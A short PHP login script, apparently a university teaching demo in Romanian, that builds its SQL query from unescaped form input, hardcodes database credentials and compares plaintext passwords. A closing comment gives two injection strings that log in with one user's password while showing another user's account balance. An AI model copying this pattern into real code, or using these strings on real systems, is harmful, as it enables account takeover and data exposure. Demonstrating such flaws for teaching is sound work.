<?php

$formEmail = $_POST['email'];
$formPassword = $_POST['parola'];

mysql_connect("localhost", "bufny", "cucubau") or die(mysql_error());
mysql_select_db("bufny") or die(mysql_error());

$query = "SELECT * FROM useri WHERE email='" . $formEmail . "'";
// print $query . "<br>";

$result = mysql_query($query);

if (mysql_num_rows($result) != 1) {
  header("Location: invalidLogin.php");
  return;
}

$row = mysql_fetch_array($result);
$dbPassword = $row['parola'];

if ($dbPassword != $formPassword) {
  header("Location: invalidLogin.php");
  return;
}

session_start();
print "Parola valida. Sunteti autentificat ca " . $formEmail . "<br>";
$_SESSION['email'] = $formEmail;
?>

Click <a href="bankAccount.php">aici</a> pentru a accesa o pagina protejata.
















































<?php
/*
Se introduce userul:
bufny@cs.ubbcluj.ro' and now() + 0 < 20090306111000 or now() + 0 > 20090306111000 and email='forest@cs.ubbcluj.ro
si parola lui bufny
Ne vom autentifica cu parola lui bufny@cs.ubbcluj.ro, dar vom vedea suma din contul lui forest@cs.ubbcluj.ro


sau
Se introduce userul:
bufny@cs.ubbcluj.ro' and now() + 0 > 20090306111300 or now() + 0 < 20090306111300 and email='forest@cs.ubbcluj.ro
si parola lui forest
Ne vom autentifica cu parola lui forest@cs.ubbcluj.ro, dar vom vedea suma din contul lui bufny@cs.ubbcluj.ro


*/
?>